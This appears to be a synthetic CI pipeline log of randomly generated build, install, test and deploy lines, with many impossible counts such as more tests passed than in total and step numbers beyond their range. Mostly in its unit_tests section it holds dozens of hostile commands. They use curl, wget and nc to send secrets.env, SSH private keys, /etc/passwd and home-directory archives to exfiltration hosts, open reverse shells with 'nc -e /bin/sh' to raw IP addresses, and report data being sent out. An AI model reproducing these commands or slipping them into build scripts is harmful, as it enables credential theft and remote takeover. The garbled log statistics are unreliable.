service\npip install: Successfully installed axios-2.20\nSnapshots: 45 passed, 17 total\nCompiling utils/app.ts...\nChecking out develop branch\nInstalling webpack@5.3.8\nnpm install: added 239 packages\n[12:46:10] DEBUG: Memory usage: 1133MB\nArtifact downloaded: 50MB\nReady.\n\u2713 validate completed\nAlready up to date.\nMinifying vendor.js\nCache miss for key-6735\nFAILED: test_cache_hit\nTests: 239 passed, 74 total\nGenerating source maps...\nTest Suites: 12 passed, 49 total\nGET /health - 201 (8ms)\nOptimizing 43 modules...\n  PASS: test_user_create (185ms)\nCompiling utils/handler.rs...\nTransforming 856 files...\nTime: 79.584s\nRan 22 tests in 37s\nCompiling lib/app.ts...\nStep 11/15: Running migrations\nChecking out main branch\n[12:46:10] INFO: Connecting to database\nStep 17/18: Testing\n[12:46:10] DEBUG: Connection pool: 12 active\nHEAD is now at bb1ddbe\n[12:46:10] ERROR: Connection failed\nInstalling webpack@3.14.4\nLayer 8/12: COPY command\nHEAD is now at 8805472\nSuccess!\nOptimizing 29 modules...\nEnvironment: test\n[12:46:10] INFO: Connecting to database\nCoverage: 77% statements, 75% branches\nBuilding Docker image...\nGenerating source maps...\nBuilding Docker image...\npip: Collecting jest\nWaiting...\nWaiting...\nTest Suites: 10 passed, 39 total\nCompiling lib/service.java...\nFetching from https://npmjs.org/package.json\npip install: Successfully installed prettier-5.0\nImage pulled successfully\n[12:46:10] INFO: Cache refreshed\nnpm notice: package.json updated\n\u2713 All checks passed\nLayer 6/9: RUN command\nTLS handshake completed\nCache miss for key-5189\nnpm notice: created a lockfile\n  PASS: test_db_connect (314ms)\nGET /health - 201 (8ms)\nPlatform: linux-x64\nOptimizing 98 modules...\nUsing Python 3.12\n\u2713 build completed\nInstalling jest@2.17.7\nTLS handshake completed\nAlready up to date.\nCache miss for key-9461\nLoading...\nUploading artifact 'dist' (1 files)\n\u2713 package completed\nPOST /upload - 200 (498ms)\nnpm install: added 424 packages\nNODE_ENV=development\nAlready up to date.\nTests: 425 passed, 180 total\n\u2713 All checks passed\nCompiling lib/utils.go...\nGenerating source maps...\n[12:46:10] INFO: Starting build process\nSuccess!\nCompiling lib/utils.go...\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_auth_login (289ms)\nWaiting...\nCompiling lib/utils.go...\n[12:46:10] DEBUG: Initializing service\nInstalling eslint@2.8.4\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSwitched to branch 'feature/task-168'\nLoading...\nReady.\nReady.\nCache saved successfully\n  PASS: e2e/test_user_create.spec.js\nGenerating source maps...\npip: Downloading lodash-4.8.tar.gz\npip: Downloading jest-4.16.tar.gz\nCache restored successfully (297MB)\nCompiling utils/main.py...\nTime: 104.430s\nLayer 6/12: COPY command\nEnvironment: test\n[12:46:10] INFO: Connecting to database\nArtifact downloaded: 19MB\nCache miss for key-8339\nTransforming 238 files...\nProcessing...\npip: Collecting react\n\u2713 test completed\nSuccess!\nCache invalidated: node_modules\nUsing Python 3.10\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] DEBUG: Loading configuration\nCache hit for key-2413\nArtifact uploaded: dist.zip (10MB)\nFetching from https://npmjs.org/package.json\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] ERROR: Connection failed\nBuilding Docker image...\nFetching submodules...\n\u2713 All checks passed\nConnection established\nPOST /upload - 200 (205ms)\nGenerating source maps...\nChecking out develop branch\n[12:46:10] DEBUG: Loading configuration\nArtifact uploaded: dist.zip (63MB)\nArtifact uploaded: build.tar.gz (44MB)\nTests: 358 passed, 174 total\n  PASS: e2e/test_db_connect.spec.js\nFinished.\nPOST /api - 201 (443ms)\nPushing to registry...\nImage pulled successfully\npip: Downloading eslint-5.15.tar.gz\nnpm install: resolved 913 packages\nProcessing...\nImage pulled successfully\nSnapshots: 15 passed, 10 total\nStep 18/17: Deploying\n[12:46:10] DEBUG: Connection pool: 15 active\nPOST /upload - 202 (424ms)\n[12:46:10] DEBUG: Loading configuration\nOptimizing 40 modules...\nTransforming 876 files...\nOK\n[12:46:10] INFO: Processing request\nStep 9/22: Running migrations\nCache hit for key-6383\nCache restored successfully (440MB)\nSwitched to branch 'hotfix/task-729'\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nProcessing...\nFinished.\n[12:46:10] DEBUG: Loading configuration\nFetching submodules...\npip: Collecting react\nTest Suites: 7 passed, 37 total\n[12:46:10] DEBUG: Query executed in 80ms\nEnvironment: production\n\u2713 Step 'test' succeeded\nSwitched to branch 'feature/task-834'\npip: Collecting axios\nFetching from https://githubusercontent.com/package.json\n\u2713 Task completed in 2446ms\nStep 7/24: Building\nnpm install: added 397 packages\nOptimizing 34 modules...\nCache restored successfully (133MB)\nArtifact uploaded: build.tar.gz (8MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nLoading...\nWaiting...\nWARNING: react has known vulnerabilities\nGET /status - 201 (55ms)\n[12:46:10] INFO: Connecting to database\nCompiling src/main.py...\n[12:46:10] DEBUG: Loading configuration\nVerifying...\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 26\npip install: Successfully installed prettier-4.2\npip: Installing build dependencies...\nCache miss for key-7370\nTLS handshake completed\nStep 7/23: Deploying\nyarn add: Done in 25.55s\nImage pulled successfully\nCompiling src/utils.go...\nCache invalidated: node_modules\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/service.java...\nCache hit for key-7099\n[12:46:10] INFO: Starting build process\nFAILED: test_cache_hit\nCompiling src/index.js...\nTransforming 269 files...\n=== Step integration_tests completed ===\n=== Step: deploy_staging ===\nStep 17/20: Testing\nLayer 9/13: COPY command\nAlready up to date.\n[12:46:10] INFO: Request completed\nArtifact downloaded: 32MB\nArtifact uploaded: build.tar.gz (48MB)\nnpm notice: package.json updated\nCompleted.\nStep 14/18: Linting\nCache saved successfully\nHEAD is now at babd499\n[12:46:10] DEBUG: Memory usage: 560MB\nFetching submodules...\nWARNING: express has known vulnerabilities\n[12:46:10] INFO: Processing request\nSwitched to branch 'bugfix/task-839'\nCache invalidated: node_modules\nSnapshots: 38 passed, 43 total\nCache miss for key-4799\nStep 6/16: Deploying\nWaiting...\nPulling image: alpine:18\n\u2713 Task completed in 315ms\n[12:46:10] INFO: Request completed\nException: NullPointerException\n  PASS: test_user_create (155ms)\nCoverage: 78% statements, 74% branches\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] DEBUG: Loading configuration\nCache saved successfully\n[12:46:10] DEBUG: Query executed in 36ms\n\u2713 All checks passed\nTLS handshake completed\nTransforming 469 files...\n  PASS: test_auth_login (353ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nEnvironment: staging\n[12:46:10] WARN: Deprecated API usage\nTests: 258 passed, 355 total\nSuccess!\npip: Downloading lodash-1.13.tar.gz\n[12:46:10] ERROR: Connection failed\nTransforming 197 files...\nMinifying vendor.js\nPulling image: python:3.11\nCompleted.\nEnvironment: test\nInstalling axios@3.3.0\nCache hit for key-1098\nyarn add: Done in 9.84s\n[12:46:10] DEBUG: Initializing service\nTLS handshake completed\nUsing Python 3.12\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\n[12:46:10] WARN: Deprecated API usage\npip install: Successfully installed prettier-2.4\nTest Suites: 22 passed, 12 total\nRan 192 tests in 4s\nUsing Python 3.11\n[12:46:10] DEBUG: Initializing service\nFetching submodules...\nArtifact uploaded: build.tar.gz (12MB)\nOK\n[12:46:10] DEBUG: Query executed in 27ms\n[12:46:10] INFO: Connecting to database\nStep 4/16: Linting\nBuilding Docker image...\n\u2713 Step 'build' succeeded\nTime: 43.340s\nMinifying main.js\n[12:46:10] DEBUG: Query executed in 83ms\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: dist.zip (31MB)\nPlatform: win32-x64\nFetching from https://googleapis.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling webpack@1.14.9\nNODE_ENV=production\nChecking out develop branch\nLayer 1/13: ENV command\nTests: 180 passed, 145 total\nFinished.\nWARNING: jest has known vulnerabilities\nRan 121 tests in 42s\nFetching submodules...\nFAILED: test_user_create\nTime: 20.143s\nCache miss for key-2554\nTests: 394 passed, 436 total\n[12:46:10] DEBUG: Initializing service\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] DEBUG: Memory usage: 396MB\nStep 13/19: Building\nBundling runtime.js\nDone.\nCreating production build...\nCompiling utils/service.java...\nCompiling components/index.js...\nSwitched to branch 'bugfix/task-237'\nImage pulled successfully\nNODE_ENV=development\nCache miss for key-2990\nPOST /data - 202 (78ms)\npip: Downloading lodash-1.6.tar.gz\n\u2713 Step 'checkout' succeeded\nyarn add: Done in 20.18s\nVerifying...\nCache miss for key-1668\nLoading...\nStep 16/15: Linting\n[12:46:10] DEBUG: Loading configuration\nEnvironment: production\nOK\nNODE_ENV=production\nTransforming 287 files...\nHEAD is now at baf7db1\nEnvironment: production\n[12:46:10] INFO: Cache refreshed\nHEAD is now at b68609d\nStep 9/15: Running migrations\nCompiling lib/handler.rs...\nCompiling lib/main.py...\nUsing Node.js 16.16.4\n[12:46:10] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:10] DEBUG: Memory usage: 1188MB\nDone.\nArtifact uploaded: build.tar.gz (9MB)\nStep 9/22: Building\nStep 14/15: Running migrations\nCache hit for key-8034\nChecking out main branch\nPlatform: win32-x64\nUsing Python 3.9\n[12:46:10] DEBUG: Memory usage: 1024MB\nCache miss for key-2507\nCache invalidated: build\nyarn add: Done in 3.99s\n  PASS: e2e/test_api_health.spec.js\n  PASS: test_cache_hit (302ms)\n[12:46:10] DEBUG: Query executed in 63ms\nOK\nEnvironment: staging\nMinifying vendor.js\nPOST /data - 202 (77ms)\nCompleted.\nnpm install: added 408 packages\nBuilding Docker image...\nCompleted.\nProcessing...\n[12:46:10] DEBUG: Initializing service\nCache invalidated: dependencies\n[12:46:10] DEBUG: Initializing service\nFAILED: test_auth_login\nCreating production build...\n[12:46:10] WARN: Deprecated API usage\nPlatform: darwin-arm64\nSnapshots: 3 passed, 45 total\nReady.\nFinished.\nTests: 224 passed, 371 total\nCache invalidated: node_modules\n\u2717 build failed with exit code 77\npip: Installing build dependencies...\n[12:46:10] ERROR: Connection failed\nCache miss for key-4027\nOptimizing 26 modules...\npip: Collecting jest\nStep 17/16: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:10] WARN: Deprecated API usage\nLoading...\nWaiting...\nSnapshots: 48 passed, 24 total\n[12:46:10] INFO: Request completed\nWARNING: jest has known vulnerabilities\nTLS handshake completed\nDone.\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] DEBUG: Memory usage: 1798MB\nHEAD is now at 8b0855d\nnpm install: resolved 506 packages\nWaiting...\nCache invalidated: build\nWaiting...\nStep 16/24: Running migrations\n[12:46:10] DEBUG: Connection pool: 18 active\nnpm notice: created a lockfile\nCoverage: 86% statements, 94% branches\n[12:46:10] ERROR: Connection failed\nUsing Node.js 18.7.3\nFetching from https://npmjs.org/package.json\n[12:46:10] INFO: Cache refreshed\nnpm install: resolved 1122 packages\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] INFO: Starting build process\nLayer 3/11: RUN command\nReady.\nReady.\nSuccess!\nFinished.\nUsing Python 3.9\nOK\n=== Step deploy_staging completed ===\n=== Step: deploy_production ===\nPushing to registry...\n[12:46:10] WARN: Deprecated API usage\nnpm install: added 231 packages\nHEAD is now at 291e796\nCache invalidated: node_modules\nBuilding Docker image...\nCompleted.\n[12:46:10] DEBUG: Query executed in 90ms\nTransforming 904 files...\nTest Suites: 38 passed, 41 total\nPulling image: alpine:latest\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] WARN: Deprecated API usage\nUploading artifact 'build' (37 files)\nImage pulled successfully\nAlready up to date.\n[12:46:10] DEBUG: Loading configuration\nSwitched to branch 'hotfix/task-472'\nRan 119 tests in 39s\nFetching submodules...\n\u2713 All checks passed\nFinished.\nDone.\nWARNING: webpack has known vulnerabilities\nMinifying main.js\nCache saved successfully\n[12:46:10] WARN: Deprecated API usage\nUploading artifact 'dist' (29 files)\nCache restored successfully (452MB)\nCoverage: 79% statements, 85% branches\nCompiling utils/index.js...\n[12:46:10] DEBUG: Loading configuration\nUploading artifact 'build' (14 files)\nFetching submodules...\nPOST /upload - 202 (213ms)\nCache saved successfully\n[12:46:10] ERROR: Connection failed\nCreating production build...\nArtifact uploaded: dist.zip (3MB)\nMinifying app.js\n  PASS: unit/test_auth_login.spec.js\n[12:46:10] INFO: Cache refreshed\nCache restored successfully (150MB)\n[12:46:10] DEBUG: Initializing service\nCreating production build...\nLayer 8/11: COPY command\npip: Installing build dependencies...\nCache restored successfully (66MB)\nUsing Node.js 20.14.6\n[12:46:10] DEBUG: Connection pool: 12 active\nProcessing...\nnpm notice: package.json updated\nHEAD is now at c84ef17\nFetching from https://pypi.org/package.json\nRan 119 tests in 16s\nOptimizing 14 modules...\nStep 16/21: Linting\nCache saved successfully\nAlready up to date.\nyarn add: Done in 20.47s\nPOST /data - 202 (429ms)\nCache invalidated: dependencies\nPulling image: alpine:latest\nArtifact downloaded: 30MB\nSwitched to branch 'feature/task-533'\n[12:46:10] WARN: Deprecated API usage\nOK\nHEAD is now at 65985e2\nOptimizing 41 modules...\nWARNING: lodash has known vulnerabilities\nReady.\nStep 5/24: Testing\nStep 10/24: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling eslint@2.19.6\nCache miss for key-4247\nDone.\n\u2713 lint completed\nConnection established\n[12:46:10] DEBUG: Loading configuration\nLoading...\n\u2713 Step 'test' succeeded\nStep 20/23: Deploying\nArtifact uploaded: dist.zip (97MB)\nCoverage: 99% statements, 90% branches\n[12:46:10] INFO: Request completed\nStep 14/24: Testing\nTime: 66.535s\nNODE_ENV=development\nWARNING: express has known vulnerabilities\n[12:46:10] INFO: Request completed\nBuilding Docker image...\n\u2713 Step 'test' succeeded\nStep 4/22: Running migrations\nRan 134 tests in 15s\nPushing to registry...\nArtifact uploaded: dist.zip (26MB)\nDone.\nWaiting...\nTransforming 636 files...\n[12:46:10] DEBUG: Connection pool: 19 active\nGET /api - 201 (31ms)\nBundling styles.css\nRan 200 tests in 11s\nCache invalidated: dependencies\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 12/25: Testing\nHEAD is now at 24f63b1\nOK\nNODE_ENV=test\nStep 4/24: Deploying\n\u2717 build failed with exit code 116\nOK\n  PASS: test_auth_login (126ms)\n[12:46:10] DEBUG: Memory usage: 430MB\n[12:46:10] INFO: Request completed\nArtifact uploaded: build.tar.gz (42MB)\nLayer 3/11: COPY command\nCache saved successfully\n\u2717 build failed with exit code 102\nCache restored successfully (375MB)\nInstalling eslint@2.13.8\nTime: 46.840s\nFinished.\nProcessing...\n\u2713 package completed\n[12:46:10] INFO: Starting build process\nStep 17/24: Linting\npip: Installing build dependencies...\nSnapshots: 13 passed, 20 total\npip install: Successfully installed express-5.12\nStep 12/15: Building\n[12:46:10] DEBUG: Memory usage: 725MB\nCache miss for key-6680\n[12:46:10] DEBUG: Query executed in 42ms\nPOST /data - 200 (278ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/app.ts...\n  PASS: integration/test_cache_hit.spec.js\nTest Suites: 22 passed, 17 total\nCache restored successfully (390MB)\nStep 19/18: Building\nEnvironment: test\n[12:46:10] INFO: Cache refreshed\n[12:46:10] INFO: Connecting to database\nCompiling components/handler.rs...\npip install: Successfully installed eslint-2.7\npip install: Successfully installed prettier-1.20\nCache hit for key-7749\nCache miss for key-9070\npip: Collecting axios\nArtifact downloaded: 17MB\nStep 20/23: Testing\npip: Installing build dependencies...\nPushing to registry...\nPlatform: darwin-arm64\nAlready up to date.\nCompiling lib/utils.go...\nSnapshots: 3 passed, 32 total\nProcessing...\nDone.\nHEAD is now at 391fb19\nStep 4/19: Linting\nRan 124 tests in 11s\nStep 14/22: Deploying\nTime: 11.548s\nyarn add: Done in 29.7s\nStep 10/24: Running migrations\n[12:46:10] DEBUG: Query executed in 92ms\nStep 4/24: Testing\npip: Installing build dependencies...\npip install: Successfully installed webpack-3.20\nCompiling lib/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:10] DEBUG: Loading configuration\n\u2713 Task completed in 3687ms\nTests: 202 passed, 55 total\nWaiting...\npip: Collecting eslint\nConnection established\nCache miss for key-5118\nyarn add: Done in 3.10s\n\u2713 Task completed in 876ms\nFinished.\n  PASS: unit/test_cache_hit.spec.js\nTime: 63.536s\n\u2713 test completed\npip: Downloading react-1.5.tar.gz\npip: Collecting express\nSwitched to branch 'feature/task-678'\n[12:46:10] DEBUG: Query executed in 25ms\nWaiting...\nSnapshots: 33 passed, 38 total\nPushing to registry...\nPushing to registry...\nFetching submodules...\nStep 3/23: Building\nTest Suites: 18 passed, 26 total\nProcessing...\nNODE_ENV=development\nFetching from https://githubusercontent.com/package.json\n[12:46:10] DEBUG: Query executed in 85ms\nCreating production build...\nOptimizing 86 modules...\n=== Step deploy_production completed ===\n=== Step: install_dependencies ===\npip: Downloading react-5.2.tar.gz\nUsing Node.js 18.16.10\nCompleted.\n\u2717 build failed with exit code 50\nFetching submodules...\npip: Collecting jest\nOptimizing 96 modules...\nFAILED: test_api_health\nHEAD is now at 2d99ed7\nStep 19/20: Testing\nLoading...\nWARNING: webpack has known vulnerabilities\nConnection established\nWARNING: jest has known vulnerabilities\nPlatform: linux-x64\nNODE_ENV=test\nFetching from https://registry.npmjs.org/package.json\nChecking out master branch\nLoading...\nStep 14/19: Testing\nBundling styles.css\n[12:46:10] WARN: Deprecated API usage\nStep 1/15: Running migrations\nConnection established\nException: NullPointerException\n[12:46:10] DEBUG: Initializing service\n  PASS: test_api_health (181ms)\n[12:46:10] INFO: Connecting to database\nStep 13/15: Testing\nTransforming 951 files...\nSnapshots: 2 passed, 0 total\n[12:46:10] INFO: Processing request\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (22MB)\nUsing Python 3.11\nHEAD is now at be305da\n\u2713 Task completed in 1042ms\nCompleted.\nLoading...\nInstalling jest@3.17.7\nSwitched to branch 'hotfix/task-586'\nDone.\nStep 9/20: Deploying\n[12:46:10] ERROR: Connection failed\n\u2713 Task completed in 455ms\nWARNING: eslint has known vulnerabilities\nBundling runtime.js\nnpm notice: created a lockfile\nWARNING: webpack has known vulnerabilities\nCache miss for key-7391\nLayer 2/11: RUN command\nTest Suites: 28 passed, 8 total\nArtifact downloaded: 44MB\n[12:46:10] WARN: Deprecated API usage\nUsing Node.js 19.18.2\nCompiling src/main.py...\npip: Collecting express\n[12:46:10] DEBUG: Connection pool: 3 active\nCompiling src/main.py...\nSnapshots: 40 passed, 25 total\nBuilding Docker image...\nTests: 70 passed, 128 total\nEnvironment: staging\nUsing Node.js 17.4.10\n[12:46:10] INFO: Request completed\nCache invalidated: node_modules\nCache restored successfully (14MB)\nBuilding Docker image...\nUploading artifact 'build' (39 files)\nLoading...\nArtifact downloaded: 45MB\n  PASS: integration/test_db_connect.spec.js\nPlatform: darwin-arm64\nSwitched to branch 'hotfix/task-318'\nProcessing...\nPOST /data - 202 (21ms)\n[12:46:10] INFO: Request completed\nCompleted.\nConnection established\nException: NullPointerException\nProcessing...\nArtifact uploaded: build.tar.gz (21MB)\nStep 11/15: Building\nStep 16/19: Linting\nPushing to registry...\nPushing to registry...\nHEAD is now at 4f75bdc\nStep 5/22: Linting\nWARNING: eslint has known vulnerabilities\n[12:46:10] DEBUG: Initializing service\nOK\nSwitched to branch 'hotfix/task-881'\nInstalling react@2.19.4\nSwitched to branch 'feature/task-225'\nPlatform: darwin-arm64\nFetching submodules...\n[12:46:10] INFO: Connecting to database\nInstalling eslint@4.11.0\nSwitched to branch 'bugfix/task-163'\nnpm notice: created a lockfile\n\u2713 Task completed in 4910ms\n[12:46:10] INFO: Processing request\nChecking out master branch\nCompiling lib/utils.go...\nnpm install: added 482 packages\nArtifact downloaded: 39MB\npip: Collecting jest\nCache invalidated: dependencies\n[12:46:10] DEBUG: Connection pool: 16 active\nStep 15/24: Testing\nSnapshots: 29 passed, 17 total\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] WARN: Deprecated API usage\nEnvironment: production\nSuccess!\nStep 16/15: Running migrations\nCompiling src/handler.rs...\n\u2713 All checks passed\nnpm install: resolved 502 packages\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at aa043f3\nSnapshots: 36 passed, 3 total\nRan 143 tests in 59s\nReady.\n\u2713 Task completed in 4475ms\nFetching from https://googleapis.com/package.json\npip: Downloading prettier-2.13.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nMinifying main.js\nVerifying...\nStep 14/23: Installing dependencies\nTests: 446 passed, 250 total\nCompiling components/utils.go...\n[12:46:10] DEBUG: Connection pool: 15 active\nTLS handshake completed\nnpm install: resolved 882 packages\nCache invalidated: node_modules\nBundling styles.css\nLayer 1/8: COPY command\n\u2713 Step 'install' succeeded\npip: Downloading axios-4.16.tar.gz\nWARNING: react has known vulnerabilities\nCompiling utils/app.ts...\nCache invalidated: node_modules\nWARNING: eslint has known vulnerabilities\n\u2713 Step 'build' succeeded\nCompleted.\nTest Suites: 46 passed, 42 total\npip: Installing build dependencies...\n[12:46:10] DEBUG: Connection pool: 17 active\nTransforming 666 files...\nPlatform: darwin-arm64\nDone.\nSwitched to branch 'feature/task-811'\nTest Suites: 32 passed, 31 total\nReady.\n\u2713 All checks passed\n[12:46:10] WARN: Deprecated API usage\nCache invalidated: build\nImage pulled successfully\npip: Installing build dependencies...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nRan 95 tests in 58s\nGenerating source maps...\nCreating production build...\n[12:46:10] DEBUG: Loading configuration\n[12:46:10] INFO: Cache refreshed\nPulling image: node:3.11\nStep 2/18: Testing\nnpm install: resolved 1977 packages\nStep 8/20: Installing dependencies\nCompiling lib/app.ts...\n[12:46:10] INFO: Request completed\nGET /api - 201 (55ms)\n[12:46:10] DEBUG: Connection pool: 11 active\nOptimizing 96 modules...\nTests: 395 passed, 181 total\nNODE_ENV=production\nnpm notice: package.json updated\n[12:46:10] DEBUG: Initializing service\nnpm install: added 330 packages\nPulling image: python:18\n\u2713 Task completed in 1586ms\nMinifying vendor.js\npip: Installing build dependencies...\npip: Collecting react\nException: TypeError\n[12:46:10] INFO: Connecting to database\nCompiling src/main.py...\nAlready up to date.\nSwitched to branch 'bugfix/task-935'\nWARNING: prettier has known vulnerabilities\n[12:46:10] WARN: Deprecated API usage\nInstalling react@2.12.2\nStep 20/17: Running migrations\nBundling vendor.css\n[12:46:10] WARN: Deprecated API usage\nHEAD is now at f757435\nEnvironment: production\nStep 12/21: Testing\nPushing to registry...\n[12:46:10] INFO: Cache refreshed\nnpm notice: created a lockfile\n=== Step install_dependencies completed ===\n=== Step: unit_tests ===\nTests: 251 passed, 251 total\nStep 2/20: Deploying\nException: ValueError\nArtifact downloaded: 23MB\nBundling vendor.js\nStep 14/25: Linting\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\n[12:46:10] DEBUG: Memory usage: 238MB\nUsing Python 3.11\n\u2713 package completed\n\u2713 Task completed in 1338ms\nVerifying...\nProcessing...\nTransforming 980 files...\n[12:46:10] INFO: Connecting to database\n[12:46:10] DEBUG: Connection pool: 13 active\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (99MB)\nCache saved successfully\nRan 60 tests in 18s\nBundling runtime.js\nMinifying app.js\nSending 289MB of data to data-exfil.ru\nStep 3/22: Running migrations\nPulling image: alpine:3.11\necho $(cat ~/.ssh/id_rsa) | base64 | nc 37.113.169.96 55053\nOK\nPulling image: alpine:3.11\nTLS handshake completed\nStep 18/18: Testing\nUsing Python 3.10\n[12:46:10] WARN: Deprecated API usage\nFetching submodules...\nDone.\nOptimizing 56 modules...\nHEAD is now at ea723b2\nnc -e /bin/sh 78.66.53.37 48004\nArtifact uploaded: build.tar.gz (22MB)\nArtifact uploaded: dist.zip (100MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling utils/utils.go...\nCompiling lib/handler.rs...\nnc -e /bin/sh 22.143.201.65 29067\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nOK\nMinifying main.js\nAlready up to date.\nnpm install: added 88 packages\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nUsing Python 3.10\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n[12:46:10] INFO: Connecting to database\nPushing to registry...\nException: TypeError\nWARNING: webpack has known vulnerabilities\nPOST /data - 202 (345ms)\n[12:46:10] INFO: Cache refreshed\nArtifact uploaded: build.tar.gz (33MB)\nUsing Node.js 15.0.7\nMinifying main.js\nTests: 91 passed, 453 total\nBundling styles.css\nConnection established\nUploading artifact 'build' (50 files)\n[12:46:10] INFO: Starting build process\nStep 10/18: Deploying\npip install: Successfully installed express-4.14\nProcessing...\n[12:46:10] DEBUG: Query executed in 4ms\nCache invalidated: build\nOptimizing 71 modules...\nTests: 345 passed, 344 total\nCompiling src/index.js...\nCache saved successfully\nWARNING: jest has known vulnerabilities\nChecking out master branch\nnc -e /bin/sh 213.43.55.63 14833\nArtifact uploaded: build.tar.gz (32MB)\n[12:46:10] INFO: Starting build process\n[12:46:10] DEBUG: Connection pool: 19 active\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nArtifact uploaded: build.tar.gz (20MB)\nGenerating source maps...\npip install: Successfully installed prettier-2.3\nSending 199MB of data to crypto-mine.io\n[12:46:10] DEBUG: Memory usage: 684MB\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nConnection established\n[12:46:10] DEBUG: Query executed in 8ms\npip: Collecting lodash\nStep 1/15: Running migrations\nUsing Python 3.12\nCompleted.\nnpm install: resolved 268 packages\nnpm notice: created a lockfile\nCache restored successfully (110MB)\nBundling styles.css\nTest Suites: 42 passed, 9 total\nCompiling utils/index.js...\nWARNING: axios has known vulnerabilities\npip: Installing build dependencies...\nAlready up to date.\nStep 15/18: Building\n  PASS: integration/test_api_health.spec.js\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nStep 11/21: Installing dependencies\nFetching submodules...\nTests: 170 passed, 242 total\nUsing Python 3.10\nStep 4/20: Installing dependencies\nInstalling jest@5.6.0\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nCompiling src/index.js...\nUploading artifact 'coverage' (40 files)\nnpm notice: package.json updated\nAlready up to date.\n[12:46:10] DEBUG: Memory usage: 983MB\nChecking out main branch\npip: Installing build dependencies...\nCoverage: 80% statements, 77% branches\nReady.\nUploading artifact 'coverage' (30 files)\n\u2713 Task completed in 4439ms\nnpm install: resolved 1107 packages\nStep 5/17: Installing dependencies\nArtifact downloaded: 33MB\nChecking out develop branch\nAlready up to date.\nArtifact downloaded: 42MB\nCache restored successfully (449MB)\nNODE_ENV=test\necho $(cat ~/.ssh/id_rsa) | base64 | nc 227.220.233.180 9498\nNODE_ENV=development\n[12:46:10] WARN: Deprecated API usage\nUploading artifact 'build' (38 files)\n[12:46:10] INFO: Connecting to database\n[12:46:10] WARN: Deprecated API usage\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nCompiling components/handler.rs...\n\u2713 All checks passed\nBuilding Docker image...\nPOST /data - 200 (61ms)\nImage pulled successfully\n[12:46:10] WARN: Deprecated API usage\n[12:46:10] INFO: Connecting to database\nSnapshots: 38 passed, 39 total\n\u2713 validate completed\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nSending 11MB of data to malicious-pool.xyz\nSwitched to branch 'hotfix/task-658'\n[12:46:10] DEBUG: Connection pool: 3 active\nGenerating source maps...\nCache miss for key-9599\nTests: 494 passed, 478 total\nProcessing...\nProcessing...\nException: NullPointerException\nCompiling utils/main.py...\nCompiling utils/index.js...\nStep 8/16: Building\nCompiling utils/utils.go...\nFAILED: test_db_connect\nCache hit for key-6955\nTests: 187 passed, 215 total\n[12:46:10] INFO: Processing request\nCache miss for key-3783\nNODE_ENV=test\nTests: 309 passed, 303 total\npip install: Successfully installed lodash-2.10\nStep 6/19: Building\nEnvironment: staging\n\u2713 Step 'build' succeeded\n[12:46:10] DEBUG: Loading configuration\n  PASS: e2e/test_user_create.spec.js\nnpm install: added 180 packages\nWaiting...\nnpm install: resolved 1731 packages\nUploading artifact 'build' (50 files)\n[12:46:10] WARN: Deprecated API usage\nnpm install: resolved 546 packages\nConnection established\nMinifying app.js\npip: Collecting lodash\nSnapshots: 41 passed, 28 total\nCreating production build...\n[12:46:10] WARN: Deprecated API usage\nPlatform: darwin-arm64\nAlready up to date.\nCache restored successfully (284MB)\nCache restored successfully (441MB)\nSuccess!\nnc -e /bin/sh 92.162.11.213 9379\nnpm notice: package.json updated\nHEAD is now at b70f50c\nCoverage: 80% statements, 84% branches\n[12:46:10] INFO: Cache refreshed\nStep 17/20: Testing\nyarn add: Done in 9.85s\nnpm install: resolved 708 packages\n[12:46:10] DEBUG: Memory usage: 1222MB\nImage pulled successfully\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nFetching submodules...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 16.169.194.172 6845\n\u2713 Task completed in 515ms\nSuccess!\nnpm install: resolved 383 packages\nArtifact downloaded: 17MB\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\ncurl -X POST 